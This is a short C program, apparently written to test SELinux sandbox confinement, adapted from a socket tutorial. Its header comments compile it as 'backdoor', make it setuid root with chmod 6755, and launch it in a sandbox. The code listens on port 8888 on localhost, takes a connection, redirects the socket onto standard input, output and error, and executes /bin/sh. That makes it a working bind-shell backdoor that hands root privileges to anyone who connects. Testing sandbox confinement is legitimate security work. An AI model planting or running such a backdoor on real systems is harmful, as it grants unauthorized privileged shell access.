/*
    source: http://www.binarytides.com/server-client-example-c-sockets-linux/
    C socket selinux test code

    mkdir ./demo
    gcc -o ./demo/backdoor backdoor.c
    sudo chown root:root ./demo/backdoor
    sudo chmod 6755 ./demo/backdoor
    sandbox -M -H "./demo" -T "./demo" -t sandbox_net_t "./demo/backdoor" 

*/
 
#include<stdio.h>
#include<string.h>    //strlen
#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include<unistd.h>    //write
 
int main(int argc , char *argv[])
{
    int socket_desc , client_sock , c , read_size;
    struct sockaddr_in server , client;
    
    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        printf("Could not create socket");
    }
    puts("Socket created");
     
    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    //listen localhost only
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    //server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( 8888 );
     
    //Bind
    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //print the error message
        perror("bind failed. Error");
        return 1;
    }
    puts("bind done");
     
    //Listen
    listen(socket_desc , 3);
     
    //Accept and incoming connection
    puts("Waiting for incoming connections...");
    c = sizeof(struct sockaddr_in);
     
    //accept connection from an incoming client
    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
    if (client_sock < 0)
    {
        perror("accept failed");
        return 1;
    }
    puts("Connection accepted");
    
    //setup uid gid 
    setreuid(geteuid(), getuid());

    //backdoor code
    dup2(client_sock, 0);
    dup2(client_sock, 1);
    dup2(client_sock, 2);
    close(client_sock);
    // message printed to the nework session
    puts("Exec shell backdoor");
    int b=execv("/bin//sh", 0);
     
    return 0;
}
